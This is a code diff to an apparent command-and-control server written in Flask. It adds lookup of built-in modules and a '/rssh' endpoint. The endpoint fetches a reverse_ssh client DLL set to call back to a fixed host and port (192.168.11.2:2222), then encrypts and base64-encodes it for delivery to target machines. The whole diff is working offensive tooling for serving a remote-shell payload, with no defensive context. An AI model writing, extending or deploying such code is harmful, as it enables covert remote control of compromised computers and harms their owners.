@@ -208,11 +208,15 @@ def load_module():
     if 'm' not in request.args:
         return Response('error')
 
-    try:
-        n = int(request.args.get('m'))
-        code = phmod.modules[n].code
-    except (IndexError, ValueError):
-        return Response("not found")
+    # load built-in module if there is one
+    code = phmod.get_builtin(request.args['m'])
+
+    if not code:
+        try:
+            n = int(request.args['m'])
+            code = phmod.modules[n].code
+        except (IndexError, ValueError):
+            return Response("not found")
 
     if 's' in request.args:
         # Slow encryption
@@ -226,6 +230,33 @@ def load_module():
     encrypted = encrypt(code, hidden_app.key)
     resp = b64encode(encrypted)
 
+    return Response(
+        resp,
+        content_type='text/plain; charset=utf-8'
+    )
+
+
+@hidden_app.route('/rssh')
+def deliver_rssh():
+    """Deliver client.dll of reverse_ssh"""
+
+    host = '192.168.11.2'
+    port = 2222
+
+    try:
+        response = hidden_app.shell_handler.request_client_dll(host, port)
+    except Exception:
+        response = "error"
+        log.error("Failed to get client.dll", exc_info=True)
+
+    if 's' in request.args:
+        # Slow encryption
+        encrypt = encrypt_rc4
+    else:
+        encrypt = encrypt_aes
+
+    encrypted = encrypt(response, hidden_app.key)
+    resp = b64encode(encrypted)
     return Response(
         resp,
         content_type='text/plain; charset=utf-8'
